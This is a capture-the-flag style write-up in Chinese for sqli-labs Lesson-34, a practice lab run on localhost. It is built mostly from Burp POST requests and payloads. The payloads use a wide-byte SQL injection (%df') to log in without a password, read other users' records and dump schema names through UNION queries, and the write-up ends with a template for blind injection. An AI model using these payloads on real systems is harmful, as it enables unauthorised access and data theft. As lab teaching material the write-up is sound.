# Lesson-34
```
宽字节绕过-,-水平越权-,-Bool盲注-,-明注
```

表单 , 需要POST提交 , 这次真是得用Burp了
```
POST /Less-34/ HTTP/1.1
Host: 127.0.0.1
Content-Length: 37
Cache-Control: max-age=0
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://127.0.0.1/Less-34/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Connection: close

uname=admin%df'&passwd=&submit=Submit
```
响应体中出现SQL语法错误 : 
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''admin�\'' and password='' LIMIT 0,1' at line 1
```
重新构造畸形用户名 : 
```
POST /Less-34/ HTTP/1.1
Host: 127.0.0.1
Content-Length: 46
Cache-Control: max-age=0
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://127.0.0.1/Less-34/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Connection: close

uname=admin%df'or%201%23&passwd=&submit=Submit
```
我们没有输入密码 , 却成功登陆 , 已越权
或者可以这样 , 获取别的用户的信息 , 水平越权
```
uname=admin%df'or%201%20limit%201,1%23&passwd=&submit=Submit
uname=admin%df'or%201%20limit%202,1%23&passwd=&submit=Submit
uname=admin%df'or%201%20limit%203,1%23&passwd=&submit=Submit
...
```
由于这里会将数据库中匹配的用户名和密码回显在页面 , 这样我们可以利用这个注入点进行明注 , 查询整个数据库的其他数据 :  
```
uname=admin%df'or%200%20union%20select%201,1%23&passwd=&submit=Submit
uname=admin%df'or%200%20union%20select%201,group_concat(schema_name)%20from%20information_schema.schemata%23&passwd=&submit=Submit
```
---
盲注
还是利用之前的通杀Payload
```
uname=admin%df'or()or%200%23&passwd=&submit=Submit
```
括号的地方可以进行盲注
